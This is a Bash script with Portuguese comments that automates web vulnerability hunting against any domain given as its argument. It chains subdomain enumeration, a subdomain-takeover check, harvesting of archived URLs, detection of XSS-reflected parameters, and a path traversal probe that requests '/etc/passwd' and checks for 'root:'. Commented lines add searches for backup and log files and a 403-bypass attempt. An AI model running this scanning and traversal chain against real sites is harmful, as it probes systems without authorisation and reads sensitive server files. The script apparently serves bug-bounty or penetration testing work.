#!/bin/bash
    echo ""
    echo "MODO DE USO"
    echo "./lowfruit.sh <dominio> <arquivo de sudominios>"
    echo "Obs: Caso não tenha o arquivo de subdominios o script fara a enumeração sozinho"
    echo ""


if [ "$2" == "" ]
then
    #------------------------- Usei meu outro script para enumeranção de subdominios ----------------------------------# 
    amass enum --passive -d $1 -o domains_$1
    assetfinder --subs-only $1 | tee -a domains_$1

    subfinder -d $1 -o domains_subfinder_$1
    cat domains_subfinder_$1 | tee -a domains_$1

    sort -u domains_$1 -o domains_$1
    cat domains_$1 | filter-resolved | tee -a domains_$1.txt
    #------------------------- Usei meu outro script para enumeranção de subdominios ----------------------------------#

    subzy -targets domains_$1 | tee subdomainTakeOver.txt #subdomain takeonver
    cat domains_$1.txt | gau --subs --threads 5 | tee allUrls.txt; #Procurar URLs com base na internet 
    grep "=" allUrls.txt | tee allParams.txt # Encontrar todos os parametros
    cat allParams.txt | kxss | cut -d " " -f 2 | tee xsstest; # Encontrar parametros refletidos
    httpx -l allUrls.txt -path "/////////////../../../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt; # Validar Path Transversal
else 
    subzy -targets domains_$1 | tee subdomainTakeOver.txt #subdomain takeonver
    cat domains_$1.txt | gau --subs --threads 5 | tee allUrls.txt; #Procurar URLs com base na internet 
    grep "=" allUrls.txt | tee allParams.txt # Encontrar todos os parametros
    cat allParams.txt | kxss | cut -d " " -f 2 | tee xsstest; # Encontrar parametros refletidos
    httpx -l allUrls.txt -path "/////////////../../../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt; # Validar Path Transversal

fi 
#cat allUrls.txt | grep -i "\.log$" | tee log.txt;
#cat allUrls.txt | grep -i "\.bak$" | tee bak.txt;
#cat allUrls.txt | grep -i "\.xlsx$" | tee xlsx.txt;
#cat allUrls.txt | grep -i "\.js$" | tee jsfiles.txt;
#cat domains_$1 | grep -i "\.<>$" allUrls.txt | tee log.txt;
#httpx -l allUrls.txt -mc 403 | tee 403s.txt; # Encontrar arquivos/direorios que nao temos acesso para tentar bypass
#/home/kali/tools/403-bypass/403-bypass.py -U 403s.txt; # tentativa de bypass com outro script
